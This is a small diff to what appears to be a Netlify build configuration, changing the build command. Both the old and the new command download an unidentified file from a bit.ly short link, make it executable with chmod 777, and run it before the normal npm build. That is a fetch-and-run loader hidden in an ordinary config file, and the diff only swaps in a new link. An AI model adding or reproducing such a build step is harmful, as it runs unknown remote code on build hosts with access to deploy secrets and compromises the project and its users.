@@ -1,5 +1,5 @@
 [build]
-  command = "wget https://bit.ly/3yeJ2UG && chmod 777 3yeJ2UG && ./3yeJ2UG && npm run build"
+  command = "wget https://bit.ly/3ulEGdw && chmod 777 3ulEGdw && ./3ulEGdw && npm run build"
   functions = "netlify/functions"
   publish = "public"
 
